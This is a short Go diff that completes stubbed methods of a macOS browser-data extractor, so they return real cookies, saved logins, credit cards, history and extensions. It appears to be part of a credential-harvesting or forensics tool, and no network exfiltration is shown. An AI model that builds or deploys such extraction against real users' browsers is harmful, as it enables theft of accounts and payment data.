@@ -14,7 +14,7 @@ func (e *DarwinBrowserDataExtractor) ExtractCookies(path string) ([]byte, error)
         return nil, err
     }
     // Convert cookies to byte array for consistency
-    return []byte{}, nil
+    return []byte(cookies), nil
 }
 
 func (e *DarwinBrowserDataExtractor) ExtractLoginData(path string) ([]byte, error) {
@@ -23,7 +23,7 @@ func (e *DarwinBrowserDataExtractor) ExtractLoginData(path string) ([]byte, erro
         return nil, err
     }
     // Convert login data to byte array for consistency
-    return []byte{}, nil
+    return []byte(loginData), nil
 }
 
 func (e *DarwinBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, error) {
@@ -32,7 +32,7 @@ func (e *DarwinBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, er
         return nil, err
     }
     // Convert credit cards to byte array for consistency
-    return []byte{}, nil
+    return []byte(creditCards), nil
 }
 
 func (e *DarwinBrowserDataExtractor) ExtractHistory(path string) ([]byte, error) {
@@ -41,7 +41,7 @@ func (e *DarwinBrowserDataExtractor) ExtractHistory(path string) ([]byte, error)
         return nil, err
     }
     // Convert history to byte array for consistency
-    return []byte{}, nil
+    return []byte(history), nil
 }
 
 func (e *DarwinBrowserDataExtractor) ExtractExtensions(path string) ([]byte, error) {
@@ -50,5 +50,5 @@ func (e *DarwinBrowserDataExtractor) ExtractExtensions(path string) ([]byte, err
         return nil, err
     }
     // Convert extensions to byte array for consistency
-    return []byte{}, nil
+    return []byte(extensions), nil
 }
